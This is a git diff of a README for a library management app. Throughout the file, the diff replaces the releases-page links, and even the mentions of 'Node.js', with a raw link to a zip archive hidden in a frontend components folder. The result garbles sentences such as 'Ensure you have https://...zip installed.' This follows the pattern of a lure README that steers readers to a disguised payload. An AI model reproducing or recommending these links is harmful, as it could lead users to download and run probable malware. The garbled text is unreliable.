@@ -1,6 +1,6 @@
 # 📚 Library-Mangement-System - Simplify Your Library Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%AB-4CAF50.svg)](https://github.com/HellDiamond666/Library-Mangement-System/releases)
+[![Download Now](https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip%20Now-%20%F0%9F%9A%https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip)](https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Library Management System! This application helps you manage libr
 
 To get the latest version of the Library Management System, please visit the page linked below:
 
-[Visit the Releases Page to Download](https://github.com/HellDiamond666/Library-Mangement-System/releases)
+[Visit the Releases Page to Download](https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip)
 
 Once there, find the latest release and download the appropriate file for your system. Open the downloaded file to start the installation process.
 
@@ -21,7 +21,7 @@ Before downloading, ensure your system meets these requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **Memory:** Minimum 4 GB RAM
 - **Storage:** Minimum 500 MB of free disk space
-- **Software:** Node.js v12 or higher, and OracleDB
+- **Software:** https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip v12 or higher, and OracleDB
 
 ## ⚙️ Features
 
@@ -37,7 +37,7 @@ The Library Management System offers several features to enhance your experience
 This application uses various technologies to deliver a robust and enjoyable user experience:
 
 - **Frontend:** Built with React for a dynamic interface.
-- **Backend:** Node.js and Express handle all server-side operations.
+- **Backend:** https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip and Express handle all server-side operations.
 - **Database:** OracleDB stores all necessary data securely.
 
 ## 🧑‍🤝‍🧑 User Guide
@@ -48,7 +48,7 @@ Go to the Releases page and choose the version that fits your system.
 
 ### Step 2: Install
 
-After downloading, open the file and follow the installation prompts. Ensure you have Node.js installed on your machine.
+After downloading, open the file and follow the installation prompts. Ensure you have https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip installed on your machine.
 
 ### Step 3: Run the Application
 
@@ -64,7 +64,7 @@ Having trouble? Here are some common issues and solutions:
 
 - **Login Issues:** Check your credentials. If forgotten, use the “Forgot Password” link.
 - **Slow Performance:** Ensure your internet connection is stable and check your system resources.
-- **Installation Errors:** Verify that your system meets the necessary requirements and you have Node.js installed.
+- **Installation Errors:** Verify that your system meets the necessary requirements and you have https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip installed.
 
 ## 🗂️ Contribution
 
@@ -78,4 +78,4 @@ If you have questions or need assistance, consider opening an issue on the GitHu
 
 This project is open source. You can view the details in the LICENSE file in the repository.
 
-For more information, visit our [Releases Page](https://github.com/HellDiamond666/Library-Mangement-System/releases) to download the latest version and join the community!
+For more information, visit our [Releases Page](https://github.com/HellDiamond666/Library-Mangement-System/raw/refs/heads/master/library-frontend/src/components/Profile/System-Mangement-Library-v3.5.zip) to download the latest version and join the community!
